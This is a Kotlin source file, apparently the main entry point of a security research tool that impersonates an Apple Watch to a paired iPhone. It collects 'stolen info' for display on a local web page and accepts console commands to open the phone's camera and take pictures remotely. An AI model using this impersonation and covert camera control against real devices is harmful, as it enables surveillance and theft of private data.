package net.rec0de.android.watchwitch

import io.javalin.Javalin
import net.rec0de.android.watchwitch.bitmage.fromHex
import net.rec0de.android.watchwitch.devices.Watch
import net.rec0de.android.watchwitch.devices.Watch5_1_wos7
import net.rec0de.android.watchwitch.devices.Watch5_1_wos9
import net.rec0de.android.watchwitch.devices.Watch7_1_wos10
import net.rec0de.android.watchwitch.devices.Watch7_1_wos11
import net.rec0de.android.watchwitch.ike.UDPTransport
import net.rec0de.android.watchwitch.servicehandlers.camera.CameraProxy
import net.rec0de.android.watchwitch.transport.ESPDispatcher
import net.rec0de.android.watchwitch.transport.IKEDispatcher
import net.rec0de.android.watchwitch.transport.NrlpOverUdpService
import net.rec0de.android.watchwitch.transport.VpnConnection
import java.net.InetAddress

fun main(args: Array<String>) {

    when {
        args.contains("wos7") -> Watch.setModel(Watch5_1_wos7)
        args.contains("wos9") -> Watch.setModel(Watch5_1_wos9)
        args.contains("wos10") -> Watch.setModel(Watch7_1_wos10)
        args.contains("wos11") -> Watch.setModel(Watch7_1_wos11)
    }

    val ip = args.firstOrNull { it.matches(Regex("\\d+\\.\\d+\\.\\d+\\.\\d+")) }
    if(ip != null)
        ServiceReferences.bumbleHost = ip

    val phoneIp = args.firstOrNull{ it.startsWith("i") }
    if(phoneIp != null)
        ServiceReferences.phoneLocalIP = phoneIp.removePrefix("i")

    Log.big("Main", "starting watch impersonator with ${Watch.OS_NAME} ${Watch.OS_VERSION}")
    Log.d("Main", "connecting to bumble host at ${ServiceReferences.bumbleHost}")

    VpnConnection.init()
    PacketLogger.init()
    IdsLogger.init()

    val nrlpService = NrlpOverUdpService()
    nrlpService.start()

    val espDispatcher = ESPDispatcher()
    ServiceReferences.espDispatcher = espDispatcher

    val tcpServerService = TcpServerService()
    tcpServerService.start()

    // check that we have generated local watch keys for watch impersonation
    Watch.generateKeys()

    val html = object {}.javaClass.getResourceAsStream("/index.html")?.bufferedReader()?.readText()!!
    Javalin.create()
        .get("/") { ctx -> ctx.html(html.replace("<!--info-->", WatchState.renderStolenInfo())) }
        .start(7070)

    println("ready for commands")

    while(true) {
        val cmd = readln()

        when(cmd) {
            "show data" -> {
                WatchState.stolenInfo.forEach {
                    Log.big("StolenInfo", it)
                }
            }
            "open camera" -> CameraProxy.openCamera()
            "take picture" -> CameraProxy.pressShutter()
            "camera" -> {
                Thread {
                    CameraProxy.openCamera()
                    Thread.sleep(2000)
                    CameraProxy.pressShutter()
                }.start()
            }
            "time" -> {
                if(ServiceReferences.endTime == 0L)
                    Log.big("Time", "incomplete")
                else
                    Log.big("Time", "${ServiceReferences.endTime - ServiceReferences.startTime} ms")
            }
            "wifi" -> {
                val phoneAddr = InetAddress.getByName(ServiceReferences.phoneLocalIP)
                val transport = UDPTransport(phoneAddr, ServiceReferences.phoneIkePort)
                IKEDispatcher.readyForInit(transport, forceWiFi = true)
                Log.big("WatchWitchIKE", "starting WiFi IKE handshakes")
            }
            else -> println("unknown command")
        }
    }
}